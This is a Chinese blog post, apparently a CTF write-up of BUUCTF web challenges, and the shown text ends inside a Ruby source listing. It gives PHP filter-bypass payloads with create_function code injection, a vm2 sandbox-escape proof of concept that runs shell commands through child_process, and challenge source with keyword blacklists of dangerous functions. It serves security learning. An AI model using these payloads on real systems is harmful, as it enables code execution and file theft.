<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BUUCTF Web Writeup 4 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BUUCTF Web Writeup 4 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/04/08/BUUCTF4/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-08T15:47:16.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>8,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">BUUCTF Web Writeup 4</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="启语"><a href="#启语" class="headerlink" title="启语"></a>启语</h2><p>不知不觉就到了第四页了，难度也是直线往上飙了，希望自己可以跟上！</p>
<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>考点：各种PHP的bypass<br>这一题我认为实在是有点难，真的，虽然是白盒审计，而且也是PHP,但是就是感觉东西很新颖啊<br>查看源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669451132576-c4b734cf-fb6d-46ae-b6da-d3955005f53f.png" alt="image.png"><br>BASE32解密<code>1nD3x.php</code>入口：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn<span class="string">&#x27;t it ?</span></span><br></pre></td></tr></table></figure>
<p>题目有多层绕过，我们一层层的剖析<br><strong>第一层——绕过$_SERVER[‘QUERY_STRING’]</strong><br>这里有个小TIPS啊，我之前也没仔细去研究，就是<code>$_SERVER[&#39;QUERY_STRING&#39;])</code>这个内置变量是不会识别URL编码的，本地测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669451545248-5e9cb4b8-7c00-4660-a0d1-2705d62ed2bb.png" alt="image.png"><br>就这样第一层就被我bypas了</p>
<p><strong>第二层——绕过preg_match</strong><br>有关内容已经接触过很多，但我还疏漏了一个：<br>在非多行模式下，$似乎会忽略在句尾的%0a</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>?a=flag%0a</code>这样就能完美bypass</p>
<p><strong>第三层——绕过$_REQUEST</strong><br>涉及我的知识盲区了，这里有个小知识：<br>众所周知REQUEST是POST和GET请求通吃的，但是假如POST和GET都传入一个变量名一样的参数呢？他会如何处理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669452620365-ad633833-0f42-4792-a0ea-b321053ed5e9.png" alt="image.png"><br>在test和1之间，他终究选择了当一个<code>1</code>咳咳<br>也就是说我们可以利用优先级来bypass</p>
<p><strong>第四层——数组绕过和data伪协议</strong><br>对于file_get_contents函数用data伪协议或者input去绕过<br>对于sha1加密用数组绕过即可</p>
<p>到这里我们就已经成功翻过了WAF了，继续往下分析：<br><code>extract($_GET[&quot;flag&quot;]);</code>会注册flag数组的变量，根据下面的<code>code,arg</code>变量来看应该是要注册他们两个，那注册什么好呢？<br><code>create_function</code>函数我们不要忘记</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="number">123</span>)</span><br><span class="line"><span class="comment">//等价于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以可以构造payload<code>flag[code]=create_function&amp;flag[arg]=1;&#125;var_dump(get_defined_vars());//</code>来获得已有变量：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编码后：</span><br><span class="line"></span><br><span class="line">【GET】file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>F%<span class="number">70</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>E%<span class="number">3</span>B%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">2</span>C%<span class="number">5</span>A%<span class="number">47</span>%<span class="number">56</span>%<span class="number">69</span>%<span class="number">64</span>%<span class="number">56</span>%<span class="number">39</span>%<span class="number">6</span>B%<span class="number">5</span>A%<span class="number">57</span>%<span class="number">4</span>A%<span class="number">31</span>%<span class="number">58</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">78</span>%<span class="number">64</span>%<span class="number">57</span>%<span class="number">45</span>%<span class="number">3</span>D&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>_is_%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>E%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">63</span>%<span class="number">6</span>F%<span class="number">64</span>%<span class="number">65</span>]=create_function&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>]=&#125;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">【POST】file=<span class="number">1</span>&amp;debu=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>可以发现他说了真的flag在<code>rea1fl4g.php</code>中，现在就是想办法去读取了：<br>由于<code>inc</code>被过滤，include无法使用，所以我们用<code>require</code>去配合filter伪协议进行一个文件读取，但是不可能是直接<code>require(php://filter/convert.base64-encode/resource</code>，由于被过滤了很多东西，我们需要对require内的参数进行一个取反绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Shaw</span></span><br><span class="line"><span class="comment">//太懒了偷了大佬的脚本</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p&quot;</span>;</span><br><span class="line"><span class="variable">$arr1</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;~(&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr1</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(~<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;)&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是进行一个取反操作</p>
<p>方法二：<br>对require里的内容进行一个base64_decode绕过，这样也可以bypass，包含了flag文件后，再get_defined_vars，由于BUUCTF上面好像动了些手脚，所以这个方法无法复现成功，得到了flag后才知道是动了什么手脚：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669453563453-e9856b3e-3bea-4de1-8fe9-171c2a19abf1.png" alt="image.png"><br>他unset销毁了flag文件，所以导致我们无法直接得到，只可以按照第一种方法去获得flag</p>
<p><strong>小误区</strong><br><code>/^[a-z0-9]*$/isD</code>看这个正则，我写的时候卡了一下，对正则的审视还是需要注意一下的<br>这一段正则的意思是<code>a_a,a.a,a*a</code>这样的不会被识别，你单输入一个a就给识别了<br><code>foreach($_REQUEST as $value)</code>，对于数组且只指定了一个as value，foreach遍历的是值，老是忘记</p>
<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>考点：任意文件读取<br>白盒测试，给了源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671524765412-0e9eab23-f6c2-434a-a2e9-2155ca06f73c.png" alt="image.png"></p>
<h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>考点：Nodejs Vm2逃逸<br>这边我自己测的时候发现了考的是nodejs，但是不知道是vm2，如何测试呢？根据报错信息去搜一下就知道他是js语法的报错信息，而不是php的，所以只能到这了<br>由于我没学完NODEJS，不熟！以后再细腻的去分析<br>这边直接丢WP：</p>
<h2 id="2022-11-27"><a href="#2022-11-27" class="headerlink" title="2022.11.27"></a>2022.11.27</h2><p>2022.12.29<br>学会了，时隔一个月，还债，诶牛魔酬宾<br>首先初步poc如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">const &#123;VM&#125; = require(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">untrusted</span> <span class="operator">=</span> <span class="string">&#x27;(&#x27;</span> + function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">            Object.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(()=&gt;&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    console.log(<span class="keyword">new</span> <span class="title class_">VM</span>().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是github上抛出的一个3.83版本的vm2逃逸漏洞，他的原理其实就是污染了TypeError对象，TypeError对象是一个错误异常，是属于沙盒外的东西，利用<code>Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</code>去抛出一个异常，<code>preventExtensions</code>方法会让一个对象无法改变它的属性，这里就触发了错误，因此抛出TypeError<br>但是这并不是最终的payload，还得bypass一下关键词过滤，这里使用ES6的模板字符串就行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">const &#123;VM&#125; = require(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">untrusted</span> <span class="operator">=</span> <span class="string">&#x27;(&#x27;</span> + function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`prototyp`&#125;e`][`$&#123;`get_proces`&#125;s`] = f=&gt;f[`$&#123;`constructo`&#125;r`](`<span class="keyword">return</span> <span class="built_in">this</span>.$&#123;`proces`&#125;s`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[`$&#123;`get_proces`&#125;s`](()=&gt;&#123;&#125;).mainModule[`$&#123;`requir`&#125;e`](`$&#123;`child_proces`&#125;s`)[`$&#123;`exe`&#125;cSync`](`whoami`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line">console.log(untrusted)</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    console.log(<span class="keyword">new</span> <span class="title class_">VM</span>().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者用数组绕过<br>当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672311532498-2d22c94f-d368-4b3b-8d74-3e4646ef3b8c.png" alt="image.png"><br>嗯，结束</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>这几把题就是有BUG<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671533520204-e891583d-7f17-47a0-b82f-83c1f4179cb2.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://7c7ff4a3-91fd-46ac-817f-7d576e1e4225.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line">req = session.get(url).text</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1010</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = re.findall(<span class="string">&quot;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&quot;</span>,req)<span class="comment">#获取[数字]</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span>.join(result)<span class="comment">#提取字符串</span></span><br><span class="line">        result = <span class="built_in">eval</span>(result)<span class="comment">#运算</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;time: &quot;</span>+ <span class="built_in">str</span>(i) +<span class="string">&quot;   &quot;</span>+<span class="string">&quot;result: &quot;</span>+ <span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&quot;answer&quot;</span>:result&#125;</span><br><span class="line">        req = session.post(url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(re.search(<span class="string">&quot;flag&#123;.*&#125;&quot;</span>, req).group(<span class="number">0</span>)[:<span class="number">50</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)<span class="comment">#防止访问太快断开连接</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>考点：Ruby ERB模板注入，JWT伪造<br>首先捏，你得先学习一下Ruby的基础语法之类的，用的是sinatrarb框架，都得学一下<br><a target="_blank" rel="noopener" href="https://sinatrarb.com/intro.html">https://sinatrarb.com/intro.html</a><br><a target="_blank" rel="noopener" href="https://ruby-china.org/topics/25648">https://ruby-china.org/topics/25648</a><br>首先是robots.txt信息泄露：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1672312620675-4d5c8897-5bfd-4f22-bc3f-1666c08d8a99.png" alt="image.png"><br>得到source</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 